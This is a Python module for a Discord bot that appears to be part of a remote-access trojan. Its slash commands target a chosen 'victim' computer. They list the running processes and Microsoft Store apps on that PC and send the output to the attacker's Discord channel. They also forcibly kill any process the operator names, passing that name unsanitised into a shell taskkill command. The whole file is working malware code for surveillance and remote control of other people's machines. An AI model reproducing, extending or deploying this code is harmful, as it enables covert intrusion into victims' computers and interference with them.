import disnake as discord
from disnake.ext import commands
from datetime import datetime
from io import BytesIO

import os, requests
nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"

class TaskList(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.slash_command( )
    async def list_runningtasks(self, ctx, victim):     
        """Lists all running tasks in the PC
        
        Parameters
        ----------
        victim: Identifier of the affected computer (found via /listvictims).
        """
        
        if str(victim) == str(self.bot.identifier):
            await ctx.response.defer()
            
            list = os.popen('tasklist').read() # I swear I'll make it better later
            
            if len(list) > 1998:
                return await ctx.followup.send(
                    file=discord.File(
                        BytesIO(bytes(list, 'utf-8')),
                        filename = "tasklist.txt"
                    )
                )
            else:
                return await ctx.followup.send(
                    f"```{list}```"
                )
                
    @commands.slash_command( )
    async def list_runningstore(self, ctx, victim):     
        """Lists all Microsoft Store apps running on the PC
        
        Parameters
        ----------
        victim: Identifier of the affected computer (found via /listvictims).
        """
        
        if str(victim) == str(self.bot.identifier):
            await ctx.response.defer()
            
            list = os.popen('tasklist /APPS').read() # I SWEAR...
            
            if len(list) > 1998:
                return await ctx.followup.send(
                    file=discord.File(
                        BytesIO(bytes(list, 'utf-8')),
                        filename = "storelist.txt"
                    )
                )
            else:
                return await ctx.followup.send(
                    f"```{list}```"
                )

    @commands.slash_command( )
    async def kill_runningtasks(self, ctx, victim, task):
        """Kills a running task on this PC. [NOTE: ADMIN TASK'S CANT BE KILLED]
        
        Parameters
        ----------
        victim: Identifier of the affected computer (found via /listvictims).
        task: Task to kill ( give real name + extension {ex: mspaint.exe} )
        """
        
        if str(victim) == str(self.bot.identifier):
            await ctx.response.defer()

            list = os.popen(f'taskkill /f /t /im {task}').read()

            if len(list) <= 1:
                return await ctx.followup.send(
                    embed = self.bot.genEmbed(
                        "Unable to find process!",
                        datetime.now()
                    )
                )
            if len(list) > 1998:
                return await ctx.followup.send(
                    file=discord.File(
                        BytesIO(bytes(list, 'utf-8')),
                        filename = "storelist.txt"
                    )
                )
            else:
                return await ctx.followup.send(
                    f"```{list}```"
                )
def setup(bot: commands.Bot):
    bot.add_cog(TaskList(bot))